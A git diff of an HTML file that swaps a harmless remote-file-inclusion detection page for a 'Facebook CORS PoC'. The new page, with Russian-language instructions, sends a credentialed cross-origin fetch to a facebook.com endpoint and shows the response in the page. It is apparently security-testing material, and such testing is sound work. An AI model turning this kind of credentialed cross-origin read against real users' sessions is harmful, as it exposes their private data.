@@ -1,21 +1,20 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Fake RFI Payload</title>
-</head>
-<body>
-  <h1>✅ RFI TEST SUCCESS</h1>
-  <p>If you see this file being included anywhere, the server is likely vulnerable to RFI or SSRF.</p>
-
-  <pre>
-  // Fake PHP payload for detection
-  &lt;?php
-      echo "✅ RFI TEST SUCCESS";
-  ?&gt;
-  </pre>
-
-  <!-- Optional tracking -->
-  <img src="https://your-github-username.github.io/rfi-test/tracker.gif" alt="." />
-</body>
+<html>
+  <body>
+    <h1>Facebook CORS PoC</h1>
+    <p>Открой эту страницу в браузере, в котором ты залогинен в Facebook</p>
+    <script>
+      fetch("https://www.facebook.com/tr?id=123456", {
+        method: "GET",
+        credentials: "include"
+      })
+      .then(r => r.text())
+      .then(t => {
+        document.body.innerHTML += "<h2>Ответ от Facebook:</h2><pre>" + t + "</pre>";
+      })
+      .catch(err => {
+        document.body.innerHTML += "<pre>Ошибка запроса: " + err + "</pre>";
+      });
+    </script>
+  </body>
 </html>
